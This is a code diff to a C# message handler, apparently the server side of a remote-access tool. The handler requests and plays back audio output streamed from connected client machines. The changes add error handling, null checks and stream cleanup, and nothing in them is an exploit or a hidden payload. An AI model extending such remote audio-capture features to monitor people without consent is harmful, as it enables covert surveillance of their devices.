@@ -6,6 +6,7 @@ using Pulsar.Common.Networking;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 
 namespace Pulsar.Server.Messages
@@ -36,7 +37,7 @@ namespace Pulsar.Server.Messages
         /// Raised when a microphone changed.
         /// </summary>
         /// <remarks>
-        /// Handlers registered with this event will be invoked on the 
+        /// Handlers registered with this event will be invoked on the
         /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
         /// </remarks>
         public event OutputChangedEventHandler OutputChanged;
@@ -68,16 +69,15 @@ namespace Pulsar.Server.Messages
             _client = client;
         }
 
-
         /// <summary>
         /// Receives the bytes.
         /// </summary>
-        BufferedWaveProvider _provider;
+        private BufferedWaveProvider _provider;
 
         /// <summary>
         /// Plays the received audio
         /// </summary>
-        WaveOut _audioStream;
+        private WaveOut _audioStream;
 
         /// <summary>
         /// Holds the desired bitrate
@@ -98,6 +98,7 @@ namespace Pulsar.Server.Messages
                 case GetOutputResponse d:
                     Execute(sender, d);
                     break;
+
                 case GetOutputDeviceResponse m:
                     Execute(sender, m);
                     break;
@@ -114,6 +115,33 @@ namespace Pulsar.Server.Messages
             {
                 try
                 {
+                    if (IsStarted)
+                    {
+                        try
+                        {
+                            _client.Send(new GetOutput { DeviceIndex = device, Destroy = true });
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error stopping existing stream: {ex.Message}");
+                        }
+                    }
+
+                    if (_audioStream != null)
+                    {
+                        try
+                        {
+                            _audioStream.Stop();
+                            _audioStream.Dispose();
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error cleaning up existing audio stream: {ex.Message}");
+                        }
+                        _audioStream = null;
+                        _provider = null;
+                    }
+
                     IsStarted = true;
                     WaveFormat waveFormat = new WaveFormat(_bitrate, 2); // 2 channels (stereo) as default
                     _provider = new BufferedWaveProvider(waveFormat);
@@ -128,9 +156,9 @@ namespace Pulsar.Server.Messages
                     IsStarted = false;
                     _provider = null;
                     _audioStream = null;
-                    System.Windows.Forms.MessageBox.Show($"Error initializing audio output device: {ex.Message}", 
-                        "Audio Error", 
-                        System.Windows.Forms.MessageBoxButtons.OK, 
+                    System.Windows.Forms.MessageBox.Show($"Error initializing audio output device: {ex.Message}",
+                        "Audio Error",
+                        System.Windows.Forms.MessageBoxButtons.OK,
                         System.Windows.Forms.MessageBoxIcon.Error);
                 }
                 catch (Exception ex)
@@ -155,8 +183,18 @@ namespace Pulsar.Server.Messages
         {
             lock (_syncLock)
             {
-                _client.Send(new GetOutput { DeviceIndex = device, Destroy = true });
-                IsStarted = false;
+                try
+                {
+                    _client.Send(new GetOutput { DeviceIndex = device, Destroy = true });
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error sending destroy message: {ex.Message}");
+                }
+                finally
+                {
+                    IsStarted = false;
+                }
             }
         }
 
@@ -172,13 +210,40 @@ namespace Pulsar.Server.Messages
         {
             lock (_syncLock)
             {
-                if (!IsStarted)
-                    return;
+                try
+                {
+                    if (!IsStarted)
+                        return;
 
-                _provider.AddSamples(message.Audio, 0, message.Audio.Length);
-                message.Audio = null;
+                    if (message?.Audio == null || message.Audio.Length == 0)
+                    {
+                        return;
+                    }
 
-                client.Send(new GetOutput { DeviceIndex = message.Device, Bitrate = _bitrate });
+                    if (_provider == null)
+                    {
+                        return;
+                    }
+
+                    _provider.AddSamples(message.Audio, 0, message.Audio.Length);
+                    message.Audio = null;
+
+                    client.Send(new GetOutput { DeviceIndex = message.Device, Bitrate = _bitrate });
+                }
+                catch (ObjectDisposedException ex)
+                {
+                    Debug.WriteLine($"Audio resources disposed: {ex.Message}");
+                    IsStarted = false;
+                }
+                catch (InvalidOperationException ex)
+                {
+                    Debug.WriteLine($"Audio stream invalid operation: {ex.Message}");
+                    IsStarted = false;
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error processing audio output: {ex.Message}");
+                }
             }
         }
 
@@ -202,15 +267,49 @@ namespace Pulsar.Server.Messages
             {
                 lock (_syncLock)
                 {
-                    if (_audioStream != null)
+                    try
                     {
-                        _audioStream.Stop();
-                        _provider.ClearBuffer();
-                        _audioStream.Dispose();
-                        _audioStream = null;
-                        _provider = null;
+                        if (_audioStream != null)
+                        {
+                            try
+                            {
+                                _audioStream.Stop();
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error stopping audio stream: {ex.Message}");
+                            }
+
+                            try
+                            {
+                                _provider?.ClearBuffer();
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error clearing audio buffer: {ex.Message}");
+                            }
+
+                            try
+                            {
+                                _audioStream.Dispose();
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error disposing audio stream: {ex.Message}");
+                            }
+
+                            _audioStream = null;
+                            _provider = null;
+                        }
                     }
-                    IsStarted = false;
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error in audio dispose: {ex.Message}");
+                    }
+                    finally
+                    {
+                        IsStarted = false;
+                    }
                 }
             }
         }
